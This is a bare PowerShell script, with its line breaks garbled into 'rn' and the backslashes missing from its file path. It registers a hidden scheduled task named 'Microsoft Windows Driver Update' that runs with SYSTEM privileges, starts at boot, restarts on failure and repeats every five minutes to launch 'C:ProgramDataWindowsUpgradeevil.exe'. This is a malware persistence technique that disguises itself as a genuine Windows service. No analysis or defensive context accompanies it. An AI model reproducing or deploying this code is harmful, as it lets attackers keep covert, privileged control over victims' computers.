$TaskName = "Microsoft Windows Driver Update"rn$TaskDescr = "Microsoft Windows Driver Update Services"rn$TaskCommand = "C:ProgramDataWindowsUpgradeevil.exe"rn$TaskScript = ""rn$TaskArg = ""rn$TaskStartTime = [datetime]::Now.AddMinutes(1) rn$service = new-object -ComObject("Schedule.Service")rn$service.Connect()rn$rootFolder = $service.GetFolder("")rn$TaskDefinition = $service.NewTask(0) rn$TaskDefinition.RegistrationInfo.Description = "$TaskDescr"rn$TaskDefinition.Settings.Enabled = $truern$TaskDefinition.Settings.Hidden = $truern$TaskDefinition.Settings.RestartCount = "5"rn$TaskDefinition.Settings.StartWhenAvailable = $truern$TaskDefinition.Settings.StopIfGoingOnBatteries = $falsern$TaskDefinition.Settings.RestartInterval = "PT5M"rn$triggers = $TaskDefinition.Triggersrn$trigger = $triggers.Create(8)rn$trigger.StartBoundary = $TaskStartTime.ToString("yyyy-MM-dd'T'HH:mm:ss")rn$trigger.Enabled = $truern$trigger.Repetition.Interval = "PT5M"rn$TaskDefinition.Settings.DisallowStartIfOnBatteries = $truern$Action = $TaskDefinition.Actions.Create(0)rn$action.Path = "$TaskCommand"rn$action.Arguments = "$TaskArg"rn$rootFolder.RegisterTaskDefinition("$TaskName",$TaskDefinition,6,"System",$null,5)rnSCHTASKS /run /TN $TaskName